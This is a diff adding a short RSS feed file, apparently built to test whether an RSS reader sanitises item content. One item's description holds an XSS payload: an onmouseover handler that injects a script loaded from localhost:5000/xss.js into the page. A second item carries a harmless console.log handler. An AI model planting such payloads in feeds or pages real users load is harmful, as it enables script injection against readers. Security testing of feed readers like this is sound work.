@@ -1,0 +1,23 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0">
+
+<channel>
+  <title>Desktop test</title>
+  <link>https://www.w3schools.com</link>
+  <description>Get freaking XSS</description>
+  <item>
+    <title>XSS Alert</title>
+    <link>https://www.w3chools.net/a</link>
+    <description>
+     <a onmouseover="var s = document.createElement('script');s.type = 'module';s.src = 'http://localhost:5000/xss.js';document.getElementsByClassName('article-wrap')[0].lastElementChild.lastElementChild.append(s)">XSS alert</a>
+    </description>
+  </item>
+  <item>
+    <title>XSS Alert2</title>
+    <link>https://www.w3chools.net/c</link>
+    <description>
+      <a onmouseover="console.log('test')" href="https://google.com">Harmless Link</a>
+    </description>
+  </item>
+</channel>
+</rss> 
